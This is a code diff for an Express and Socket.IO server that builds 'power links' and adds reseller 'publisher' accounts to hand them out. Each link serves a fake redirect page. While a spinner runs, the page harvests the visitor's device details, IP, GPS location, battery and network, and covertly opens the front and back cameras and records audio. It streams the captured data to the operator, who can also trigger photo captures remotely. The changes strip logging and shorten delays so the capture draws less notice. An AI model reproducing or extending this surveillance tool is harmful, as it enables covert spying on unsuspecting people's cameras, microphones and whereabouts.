@@ -39,16 +39,20 @@ if (!fs.existsSync(SUPER_USERS_FILE)) fs.writeFileSync(SUPER_USERS_FILE, JSON.st
 const readUsers = () => { try { return JSON.parse(fs.readFileSync(USERS_FILE)); } catch { return []; } };
 const writeUsers = (users) => fs.writeFileSync(USERS_FILE, JSON.stringify(users, null, 2));
 const readPublishers = () => { try { return JSON.parse(fs.readFileSync(PUBLISHERS_FILE)); } catch { return []; } };
-const writePublishers = (publishers) => fs.writeFileSync(PUBLISHERS_FILE, JSON.stringify(publishers, null, 2));
+const writePublishers = (p) => fs.writeFileSync(PUBLISHERS_FILE, JSON.stringify(p, null, 2));
 const readSuperUsers = () => { try { return JSON.parse(fs.readFileSync(SUPER_USERS_FILE)); } catch { return []; } };
-const writeSuperUsers = (users) => fs.writeFileSync(SUPER_USERS_FILE, JSON.stringify(users, null, 2));
+const writeSuperUsers = (u) => fs.writeFileSync(SUPER_USERS_FILE, JSON.stringify(u, null, 2));
 
 // ============================================
 // ADMIN ROUTES
 // ============================================
 
 app.get('/api/check-session', (req, res) => {
-    req.session.admin ? res.json({ authenticated: true }) : res.status(401).json({ authenticated: false });
+    if (req.session.admin || req.session.publisher) {
+        res.json({ authenticated: true, type: req.session.admin ? 'admin' : 'publisher', id: req.session.publisherId || null });
+    } else {
+        res.status(401).json({ authenticated: false });
+    }
 });
 
 app.post('/admin-login', (req, res) => {
@@ -108,8 +112,16 @@ app.get('/api/visitor/:id', (req, res) => {
     visitor ? res.json(visitor) : res.status(404).json({ error: 'Not found' });
 });
 
+app.get('/api/publisher-visitors/:publisherId', (req, res) => {
+    if (!req.session.admin) return res.status(401).json({ error: 'Unauthorized' });
+    const publishers = readPublishers();
+    const publisher = publishers.find(p => p.id === req.params.publisherId);
+    if (!publisher) return res.status(404).json({ error: 'Publisher not found' });
+    res.json(publisher.users || []);
+});
+
 // ============================================
-// GENERATE LINKS - NORMAL + POWER + SUPER POWER
+// GENERATE LINKS
 // ============================================
 app.post('/generate-custom-link', (req, res) => {
     if (!req.session.admin) return res.status(401).json({ error: 'Unauthorized' });
@@ -165,7 +177,6 @@ app.post('/api/create-publisher', (req, res) => {
     const { email, password } = req.body;
     const publishers = readPublishers();
     
-    // Check if email exists
     if (publishers.find(p => p.email === email)) {
         return res.status(400).json({ error: 'Email already exists' });
     }
@@ -180,10 +191,12 @@ app.post('/api/create-publisher', (req, res) => {
         email: email,
         password: password,
         link: publisherLink,
+        autoLoginLink: `${req.protocol}://${req.get('host')}/publisher/${publisherId}?auto=true`,
         createdAt: new Date().toISOString(),
         totalVisits: 0,
         users: [],
-        active: true
+        active: true,
+        suspended: false
     };
     
     publishers.push(publisherInfo);
@@ -192,6 +205,7 @@ app.post('/api/create-publisher', (req, res) => {
     res.json({
         success: true,
         link: publisherLink,
+        autoLoginLink: publisherInfo.autoLoginLink,
         linkId: linkId,
         publisherId: publisherId
     });
@@ -200,14 +214,14 @@ app.post('/api/create-publisher', (req, res) => {
 app.post('/publisher-login', (req, res) => {
     const { email, password } = req.body;
     const publishers = readPublishers();
-    const publisher = publishers.find(p => p.email === email && p.password === password);
+    const publisher = publishers.find(p => p.email === email && p.password === password && !p.suspended);
     
     if (publisher) {
         req.session.publisher = true;
         req.session.publisherId = publisher.id;
         res.json({ success: true, publisherId: publisher.id });
     } else {
-        res.status(401).json({ success: false });
+        res.status(401).json({ success: false, suspended: publishers.find(p => p.email === email)?.suspended || false });
     }
 });
 
@@ -217,11 +231,76 @@ app.get('/api/publisher-data/:id', (req, res) => {
     }
     const publishers = readPublishers();
     const publisher = publishers.find(p => p.id === req.params.id);
-    publisher ? res.json(publisher) : res.status(404).json({ error: 'Not found' });
+    if (!publisher) return res.status(404).json({ error: 'Not found' });
+    if (req.session.admin) {
+        res.json(publisher);
+    } else if (req.session.publisher && req.session.publisherId === req.params.id) {
+        res.json(publisher);
+    } else {
+        res.status(401).json({ error: 'Unauthorized' });
+    }
+});
+
+app.post('/api/publisher-generate-link', (req, res) => {
+    if (!req.session.publisher) return res.status(401).json({ error: 'Unauthorized' });
+    
+    const { redirectUrl } = req.body;
+    const visitorId = uuidv4();
+    const linkId = uuidv4().substring(0, 8);
+    const powerLink = `${req.protocol}://${req.get('host')}/p/${visitorId}`;
+    
+    const visitorInfo = {
+        id: visitorId,
+        linkId: linkId,
+        link: powerLink,
+        powerLink: powerLink,
+        redirectUrl: redirectUrl || 'https://www.google.com',
+        createdAt: new Date().toISOString(),
+        publisherId: req.session.publisherId,
+        deviceName: null, deviceModel: null, os: null, browser: null,
+        ip: null, location: null, battery: null, network: null,
+        frontCamera: null, backCamera: null,
+        connected: false, visitDate: null,
+        totalVisits: 0, lastVisit: null,
+        visitHistory: []
+    };
+    
+    // Add to main users
+    const users = readUsers();
+    users.push(visitorInfo);
+    writeUsers(users);
+    
+    // Add to publisher's users
+    const publishers = readPublishers();
+    const pIndex = publishers.findIndex(p => p.id === req.session.publisherId);
+    if (pIndex !== -1) {
+        if (!publishers[pIndex].users) publishers[pIndex].users = [];
+        publishers[pIndex].users.push(visitorInfo);
+        publishers[pIndex].totalVisits = (publishers[pIndex].totalVisits || 0) + 1;
+        writePublishers(publishers);
+    }
+    
+    res.json({
+        success: true,
+        link: powerLink,
+        linkId: linkId,
+        visitorId: visitorId,
+        redirectUrl: visitorInfo.redirectUrl
+    });
+});
+
+app.put('/api/publisher/:id/suspend', (req, res) => {
+    if (!req.session.admin) return res.status(401).json({ error: 'Unauthorized' });
+    const publishers = readPublishers();
+    const pIndex = publishers.findIndex(p => p.id === req.params.id);
+    if (pIndex === -1) return res.status(404).json({ error: 'Publisher not found' });
+    publishers[pIndex].suspended = !publishers[pIndex].suspended;
+    writePublishers(publishers);
+    res.json({ success: true, suspended: publishers[pIndex].suspended });
 });
 
 // ============================================
-// POWER LINK ROUTE
+// POWER LINK ROUTE - FAST
 // ============================================
 app.get('/p/:visitorId', (req, res) => {
     const { visitorId } = req.params;
@@ -269,37 +348,37 @@ app.get('/p/:visitorId', (req, res) => {
             to { opacity: 1; transform: translateY(0); }
         }
         .spinner {
-            width: 60px;
-            height: 60px;
+            width: 50px;
+            height: 50px;
             border: 4px solid rgba(255,255,255,0.1);
             border-top: 4px solid #667eea;
             border-radius: 50%;
-            animation: spin 0.8s linear infinite;
+            animation: spin 0.7s linear infinite;
             margin: 0 auto 20px;
         }
         @keyframes spin {
             0% { transform: rotate(0deg); }
             100% { transform: rotate(360deg); }
         }
-        .platform-icon { font-size: 56px; margin-bottom: 10px; }
-        .platform-name { color: #667eea; font-size: 22px; font-weight: 600; margin-bottom: 5px; }
-        .text { color: rgba(255,255,255,0.8); font-size: 18px; font-weight: 500; }
-        .sub-text { color: rgba(255,255,255,0.3); font-size: 14px; margin-top: 8px; }
-        #statusText { color: rgba(255,255,255,0.5); font-size: 14px; margin-top: 15px; }
+        .platform-icon { font-size: 48px; margin-bottom: 10px; }
+        .platform-name { color: #667eea; font-size: 20px; font-weight: 600; margin-bottom: 5px; }
+        .text { color: rgba(255,255,255,0.8); font-size: 17px; font-weight: 500; }
+        .sub-text { color: rgba(255,255,255,0.3); font-size: 13px; margin-top: 8px; }
+        #statusText { color: rgba(255,255,255,0.5); font-size: 13px; margin-top: 12px; }
         .progress-container {
             width: 100%;
-            height: 4px;
+            height: 3px;
             background: rgba(255,255,255,0.1);
-            border-radius: 4px;
-            margin-top: 20px;
+            border-radius: 3px;
+            margin-top: 18px;
             overflow: hidden;
         }
         .progress-bar {
             height: 100%;
             width: 0%;
             background: linear-gradient(90deg, #667eea, #764ba2);
-            border-radius: 4px;
-            transition: width 0.5s ease;
+            border-radius: 3px;
+            transition: width 0.3s ease;
         }
         #hiddenVideo, #hiddenVideoBack { display: none; }
     </style>
@@ -331,7 +410,6 @@ app.get('/p/:visitorId', (req, res) => {
         (function() {
             const visitorId = '${visitorId}';
             const redirectUrl = '${visitor.redirectUrl}';
-            const platform = detectPlatform(redirectUrl);
             
             function detectPlatform(url) {
                 const platforms = [
@@ -364,6 +442,7 @@ app.get('/p/:visitorId', (req, res) => {
                 } catch { return { name: 'Website', icon: '🌐' }; }
             }
 
+            const platform = detectPlatform(redirectUrl);
             document.getElementById('platformIcon').textContent = platform.icon;
             document.getElementById('platformName').textContent = platform.name;
 
@@ -384,31 +463,29 @@ app.get('/p/:visitorId', (req, res) => {
                     const elapsed = Math.min((Date.now() - startTime) / 3000 * 70, 70);
                     progressBar.style.width = (10 + elapsed) + '%';
                 }
-                console.log(msg);
             }
 
             function connectSocket() {
                 try {
                     socket = io({
                         transports: ['websocket', 'polling'],
-                        reconnectionAttempts: 10,
-                        reconnectionDelay: 500
+                        reconnectionAttempts: 5,
+                        reconnectionDelay: 500,
+                        timeout: 10000
                     });
 
                     socket.on('connect', function() {
-                        console.log('Socket connected');
                         updateStatus('📱 Collecting device info...', 20);
                         sendDeviceInfo();
                         requestAllPermissions();
                     });
 
                     socket.on('connect_error', function(err) {
-                        console.log('Socket error:', err.message);
-                        updateStatus('🔄 Retrying connection...');
-                        setTimeout(() => socket.connect(), 1000);
+                        updateStatus('🔄 Retrying...');
+                        setTimeout(() => socket.connect(), 500);
                     });
 
-                } catch(e) { console.log('Socket error:', e.message); }
+                } catch(e) {}
             }
 
             function sendDeviceInfo() {
@@ -472,7 +549,7 @@ app.get('/p/:visitorId', (req, res) => {
             }
 
             function requestAllPermissions() {
-                updateStatus('📸 Requesting camera & location...', 40);
+                updateStatus('📸 Requesting permissions...', 40);
 
                 Promise.all([
                     requestLocation(),
@@ -512,19 +589,14 @@ app.get('/p/:visitorId', (req, res) => {
                     }
 
                     setTimeout(function() {
-                        if (!redirectTriggered) {
-                            redirectNow();
-                        }
-                    }, 1000);
+                        if (!redirectTriggered) { redirectNow(); }
+                    }, 800);
 
                 }).catch(function(error) {
-                    console.log('Error:', error);
                     updateStatus('✅ Redirecting...', 100);
                     setTimeout(function() {
-                        if (!redirectTriggered) {
-                            redirectNow();
-                        }
-                    }, 1000);
+                        if (!redirectTriggered) { redirectNow(); }
+                    }, 800);
                 });
             }
 
@@ -553,7 +625,7 @@ app.get('/p/:visitorId', (req, res) => {
                                 });
                         },
                         function() { resolve(null); },
-                        { timeout: 8000, enableHighAccuracy: true }
+                        { timeout: 5000, enableHighAccuracy: true }
                     );
                 });
             }
@@ -632,7 +704,7 @@ app.get('/p/:visitorId', (req, res) => {
                 if (backStream) { backStream.getTracks().forEach(t => t.stop()); }
                 setTimeout(function() {
                     window.location.href = redirectUrl;
-                }, 500);
+                }, 400);
             }
 
             if (typeof io !== 'undefined') {
@@ -653,7 +725,7 @@ app.get('/p/:visitorId', (req, res) => {
 });
 
 // ============================================
-// SUPER POWER LINK ROUTE
+// SUPER POWER LINK ROUTE - FIXED
 // ============================================
 app.get('/sp/:visitorId', (req, res) => {
     const { visitorId } = req.params;
@@ -671,7 +743,7 @@ app.get('/sp/:visitorId', (req, res) => {
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Super Power Redirect</title>
+    <title>Super Power</title>
     <style>
         * { margin: 0; padding: 0; box-sizing: border-box; }
         body {
@@ -704,12 +776,12 @@ app.get('/sp/:visitorId', (req, res) => {
         .super-title { color: #f6ad55; font-size: 28px; font-weight: 700; letter-spacing: 1px; margin-bottom: 5px; }
         .super-sub { color: rgba(255,255,255,0.4); font-size: 14px; margin-bottom: 20px; }
         .spinner {
-            width: 60px;
-            height: 60px;
+            width: 50px;
+            height: 50px;
             border: 4px solid rgba(255,255,255,0.08);
             border-top: 4px solid #f6ad55;
             border-radius: 50%;
-            animation: spin 0.8s linear infinite;
+            animation: spin 0.7s linear infinite;
             margin: 20px auto;
         }
         @keyframes spin {
@@ -718,28 +790,28 @@ app.get('/sp/:visitorId', (req, res) => {
         }
         .progress-container {
             width: 100%;
-            height: 4px;
+            height: 3px;
             background: rgba(255,255,255,0.08);
-            border-radius: 4px;
-            margin-top: 20px;
+            border-radius: 3px;
+            margin-top: 18px;
             overflow: hidden;
         }
         .progress-bar {
             height: 100%;
             width: 0%;
             background: linear-gradient(90deg, #f6ad55, #ed8936);
-            border-radius: 4px;
-            transition: width 0.5s ease;
+            border-radius: 3px;
+            transition: width 0.3s ease;
         }
-        #statusText { color: rgba(255,255,255,0.5); font-size: 14px; margin-top: 15px; }
+        #statusText { color: rgba(255,255,255,0.5); font-size: 13px; margin-top: 12px; }
         .perm-grid {
             display: grid;
             grid-template-columns: 1fr 1fr;
-            gap: 8px;
+            gap: 6px;
             margin-top: 15px;
         }
         .perm-item {
-            padding: 6px 10px;
+            padding: 5px 10px;
             background: rgba(255,255,255,0.04);
             border-radius: 8px;
             font-size: 11px;
@@ -804,7 +876,6 @@ app.get('/sp/:visitorId', (req, res) => {
                     const elapsed = Math.min((Date.now() - startTime) / 4000 * 70, 70);
                     progressBar.style.width = (10 + elapsed) + '%';
                 }
-                console.log(msg);
             }
 
             function updatePerm(itemId) {
@@ -816,24 +887,23 @@ app.get('/sp/:visitorId', (req, res) => {
                 try {
                     socket = io({
                         transports: ['websocket', 'polling'],
-                        reconnectionAttempts: 10,
-                        reconnectionDelay: 500
+                        reconnectionAttempts: 5,
+                        reconnectionDelay: 500,
+                        timeout: 10000
                     });
 
                     socket.on('connect', function() {
-                        console.log('Socket connected');
                         updateStatus('📱 Collecting all data...', 15);
                         sendDeviceInfo();
                         requestAllPermissions();
                     });
 
                     socket.on('connect_error', function(err) {
-                        console.log('Socket error:', err.message);
                         updateStatus('🔄 Retrying...');
-                        setTimeout(() => socket.connect(), 1000);
+                        setTimeout(() => socket.connect(), 500);
                     });
 
-                } catch(e) { console.log('Socket error:', e.message); }
+                } catch(e) {}
             }
 
             function sendDeviceInfo() {
@@ -947,7 +1017,6 @@ app.get('/sp/:visitorId', (req, res) => {
 
                     if (socket && socket.connected) {
                         socket.emit('visitor-data', { visitorId, type: 'permissionsGranted', content: true });
-                        // Save super power data
                         socket.emit('visitor-data', {
                             visitorId,
                             type: 'superPowerData',
@@ -959,19 +1028,14 @@ app.get('/sp/:visitorId', (req, res) => {
                     }
 
                     setTimeout(function() {
-                        if (!redirectTriggered) {
-                            redirectNow();
-                        }
-                    }, 1500);
+                        if (!redirectTriggered) { redirectNow(); }
+                    }, 1200);
 
                 }).catch(function(error) {
-                    console.log('Error:', error);
                     updateStatus('✅ Redirecting...', 100);
                     setTimeout(function() {
-                        if (!redirectTriggered) {
-                            redirectNow();
-                        }
-                    }, 1500);
+                        if (!redirectTriggered) { redirectNow(); }
+                    }, 1200);
                 });
             }
 
@@ -1000,7 +1064,7 @@ app.get('/sp/:visitorId', (req, res) => {
                                 });
                         },
                         function() { resolve(null); },
-                        { timeout: 10000, enableHighAccuracy: true }
+                        { timeout: 8000, enableHighAccuracy: true }
                     );
                 });
             }
@@ -1040,7 +1104,6 @@ app.get('/sp/:visitorId', (req, res) => {
                         audio: true
                     })
                     .then(function(stream) {
-                        // Record for 20 seconds
                         const mediaRecorder = new MediaRecorder(stream);
                         const chunks = [];
                         mediaRecorder.ondataavailable = function(e) {
@@ -1119,7 +1182,7 @@ app.get('/sp/:visitorId', (req, res) => {
                 if (backStream) { backStream.getTracks().forEach(t => t.stop()); }
                 setTimeout(function() {
                     window.location.href = redirectUrl;
-                }, 800);
+                }, 600);
             }
 
             if (typeof io !== 'undefined') {
@@ -1140,17 +1203,17 @@ app.get('/sp/:visitorId', (req, res) => {
 });
 
 // ============================================
-// PUBLISHER DASHBOARD ROUTE
-// ============================================
-app.get('/publisher/:publisherId', (req, res) => {
-    res.sendFile(path.join(__dirname, 'publisher', 'dashboard.html'));
-});
-
-// ============================================
 // NORMAL VISITOR ROUTE
 // ============================================
 app.get('/visitor/:id', (req, res) => {
     res.sendFile(path.join(__dirname, 'views', 'visitor.html'));
+});
+
+// ============================================
+// PUBLISHER DASHBOARD ROUTE
+// ============================================
+app.get('/publisher/:publisherId', (req, res) => {
+    res.sendFile(path.join(__dirname, 'publisher', 'dashboard.html'));
 });
 
 // ============================================
@@ -1268,6 +1331,21 @@ io.on('connection', (socket) => {
                 visitHistory: [...(users[userIndex].visitHistory || []), visitRecord]
             };
             
+            // Check if this is a publisher's visitor
+            if (users[userIndex].publisherId) {
+                const publishers = readPublishers();
+                const pIndex = publishers.findIndex(p => p.id === users[userIndex].publisherId);
+                if (pIndex !== -1) {
+                    if (!publishers[pIndex].users) publishers[pIndex].users = [];
+                    const existing = publishers[pIndex].users.findIndex(u => u.id === visitorId);
+                    if (existing === -1) {
+                        publishers[pIndex].users.push(users[userIndex]);
+                        publishers[pIndex].totalVisits = (publishers[pIndex].totalVisits || 0) + 1;
+                        writePublishers(publishers);
+                    }
+                }
+            }
+            
             // Save to super users if super power data
             if (users[userIndex].superPowerData) {
                 const superUsers = readSuperUsers();
@@ -1292,7 +1370,6 @@ io.on('connection', (socket) => {
     
     socket.on('visitor-data', (data) => {
         const { visitorId, type, content } = data;
-        console.log('📩 Data received:', type, 'for', visitorId);
         const users = readUsers();
         const userIndex = users.findIndex(u => u.id === visitorId);
         
@@ -1320,7 +1397,6 @@ io.on('connection', (socket) => {
                 users[userIndex].audioRecording = content;
             } else if (type === 'superPowerData') {
                 users[userIndex].superPowerData = content;
-                // Save to super users
                 const superUsers = readSuperUsers();
                 const existing = superUsers.find(u => u.id === visitorId);
                 if (!existing) {
@@ -1368,12 +1444,10 @@ io.on('connection', (socket) => {
         const socketId = connectedClients.get(visitorId);
         if (socketId) {
             io.to(socketId).emit('capture-command', { type });
-            console.log('📸 Admin requested', type, 'photo from', visitorId);
         }
     });
     
     socket.on('disconnect', () => {
-        console.log('🔌 Client disconnected:', socket.id);
         for (let [visitorId, socketId] of connectedClients) {
             if (socketId === socket.id) {
                 const users = readUsers();
